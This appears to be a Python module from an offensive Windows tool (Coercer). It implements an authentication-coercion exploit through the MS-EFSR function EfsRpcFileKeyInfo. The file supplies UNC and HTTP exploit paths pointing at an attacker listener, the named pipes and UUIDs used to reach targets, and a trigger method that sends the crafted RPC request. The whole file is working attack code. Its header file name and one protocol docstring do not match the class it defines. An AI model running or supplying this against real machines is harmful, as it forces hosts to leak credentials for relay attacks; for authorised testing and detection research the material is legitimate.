#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : EfsRpcOpenFileRaw.py
# Author             : Podalirius (@podalirius_)
# Date created       : 16 Sep 2022


from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
from coercer.network.DCERPCSessionError import DCERPCSessionError
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID


class _EfsRpcFileKeyInfo(NDRCALL):
    """
    Structure to make the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
    """
    opnum = 12
    structure = (
        ('FileName', WSTR),   # Type: wchar_t *
        ('InfoClass', DWORD)  # Type: DWORD
    )


class _EfsRpcFileKeyInfoResponse(NDRCALL):
    """
    Structure to parse the response of the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
    """
    structure = ()


class EfsRpcFileKeyInfo(MSPROTOCOLRPCCALL):
    """
    Coercing a machine to authenticate using function EfsRpcFileKeyInfo (opnum 12) of [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)

    Method found by:
     - [@topotam77](https://twitter.com/topotam77)
    """

    exploit_paths = [
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
        ("http", '\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\file.txt\x00'),
    ]

    access = {
        "ncan_np": [
            {
                "namedpipe": r"\PIPE\efsrpc",
                "uuid": "df1941c5-fe89-4e79-bf10-463657acf44d",
                "version": "1.0"
            },
            {
                "namedpipe": r"\PIPE\lsarpc",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0"
            },
            {
                "namedpipe": r"\PIPE\samr",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0"
            },
            {
                "namedpipe": r"\PIPE\lsass",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0"
            },
            {
                "namedpipe": r"\PIPE\netlogon",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0"
            },
        ]
    }

    protocol = {
        "longname": "[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol",
        "shortname": "MS-EFSR"
    }

    function = {
        "name": "EfsRpcFileKeyInfo",
        "opnum": 12,
        "vulnerable_arguments": ["FileName"]
    }

    def trigger(self, dcerpc_session, target):
        if dcerpc_session is not None:
            try:
                request = _EfsRpcFileKeyInfo()
                request['FileName'] = self.path
                request['InfoClass'] = 0
                resp = dcerpc_session.request(request)
                return ""
            except Exception as err:
                return err
        else:
            print("[!] Error: dce is None, you must call connect() first.")
            return None
